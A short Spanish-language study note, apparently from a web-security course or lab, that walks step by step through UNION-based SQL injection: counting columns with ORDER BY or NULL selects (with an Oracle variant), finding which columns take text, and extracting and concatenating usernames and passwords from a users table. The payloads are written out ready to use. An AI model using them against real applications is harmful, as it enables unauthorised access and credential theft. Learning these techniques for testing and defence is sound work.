
1º Usar el código ' ORDER BY x-- para ver el numero de columnas que tiene la consulta original se va aumentando o reduciendo el número hasta que no muestre error también se puede hacer con: ' UNION SELECT NULL,NULL,NULL--, en Oracle debido a su configuración ha de ser así: 
`' UNION SELECT NULL FROM DUAL-- -`

2º Ya obtenido el numero de columnas con el siguiente código podemos ir viendo los elementos de las columnas si son String, int o char:

`' UNION SELECT NULL,NULL,NULL,'a'-- -`

3º Una vez visto los tipos de elemento y numero de string de las tablas podemos una tabla de usuarios y contraseñas mediante el código: `' UNION SELECT username, password FROM users-- -` Para realizar el codigo correctamente necesitamos saber el nombre de la tabla y el nombre de las columnas ir a Examining Database

4º Podemos poner todo en una misma linea usando el siguiente comando para concaterar las dos columnas: `' UNION SELECT NULL, username || '~' || password FROM users-- -`